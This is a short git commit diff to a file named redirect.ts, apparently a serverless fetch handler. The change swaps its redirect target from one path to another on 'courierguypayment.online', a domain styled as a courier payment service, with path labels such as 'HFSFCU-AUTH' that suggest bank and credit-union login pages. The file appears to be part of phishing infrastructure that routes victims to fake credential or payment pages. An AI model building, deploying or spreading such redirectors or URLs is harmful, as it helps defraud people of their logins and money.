e1fefdfe7c2e1c355cecc00f5cb8c7558ed2b9a5
atcivepro99 <atcivepro@gmail.com>
2025-07-14 00:46:43 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://courierguypayment.online/dashboard/HFSFCU-AUTH/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://courierguypayment.online/dashboard/BT"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
